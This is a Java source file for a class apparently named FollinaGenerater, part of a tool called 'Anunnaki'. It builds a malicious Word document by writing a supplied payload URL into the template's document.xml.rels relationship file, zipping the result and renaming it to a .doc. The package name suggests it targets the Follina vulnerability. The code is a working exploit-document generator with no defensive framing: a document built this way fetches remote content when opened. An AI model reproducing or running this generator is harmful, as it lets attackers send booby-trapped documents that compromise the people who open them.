package follina.server;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.apache.commons.io.FileUtils;

public class FollinaGenerater implements Runnable {

	// Constante template
	private final static String TEMPLATE_DIRECTORY = "doc";
	private final static String TEMPORARY_WORD_DIRECTORY = "TempWord";
	private final static String OUTPUT_ZIP = "anunnaki.zip";
	private final static String OUTPUT_DOC = "anunnaki.doc";

	private final static short TAMPON = 1024;

	private String payloadLink;

	public FollinaGenerater(String payloadLink) {
		this.payloadLink = payloadLink;
	}

	private static String readFileContent(String path) throws FolinaException {

		try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(new File(path)))) {

			int l;
			byte[] readBuff = new byte[TAMPON];
			String content = "";
			while ((l = bis.read(readBuff)) > 0)
				content += new String(readBuff, 0, l);
			return content;

		} catch (IOException e) {
			throw new FolinaException("Anunnaki can't read the file");
		}
	}

	private static void writeFileContent(String path, String content) throws FolinaException {
		try (BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(new File(path)))) {
			bos.write(content.getBytes());
		} catch (IOException e) {
			throw new FolinaException("Anunnaki can't read the file");
		}
	}

	public static void pack(String sourceDirPath, String zipFilePath) throws IOException {
		Path p = Files.createFile(Paths.get(zipFilePath));
		try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
			Path pp = Paths.get(sourceDirPath);
			Files.walk(pp).filter(path -> !Files.isDirectory(path)).forEach(path -> {
				ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
				try {
					zs.putNextEntry(zipEntry);
					Files.copy(path, zs);
					zs.closeEntry();
				} catch (IOException e) {
					System.err.println(e);
				}
			});
		}
	}

	@Override
	public void run() {
		try {
			File temporaryWork = new File(TEMPORARY_WORD_DIRECTORY);
			if (temporaryWork.exists())
				temporaryWork.delete();

			temporaryWork.mkdir();

			FileUtils.copyDirectory(new File(TEMPLATE_DIRECTORY), temporaryWork);

			Path stepdirectory = Paths.get(TEMPORARY_WORD_DIRECTORY, "word", "_rels", "document.xml.rels");
			String documentXml = readFileContent(stepdirectory.toString());
			documentXml = documentXml.replace("{staged_html}", this.payloadLink);
			writeFileContent(stepdirectory.toString(), documentXml);

			/*
			 * Making Our word to a doc file , i create .zip then i ll rename it .doc
			 * because every package origin is .zip
			 * 
			 */
			pack(TEMPORARY_WORD_DIRECTORY, OUTPUT_ZIP);
			File outputZip = new File(OUTPUT_ZIP);
			outputZip.renameTo(new File(OUTPUT_DOC));
		} catch (FolinaException | IOException e) {
			e.printStackTrace();
		}
	}

}
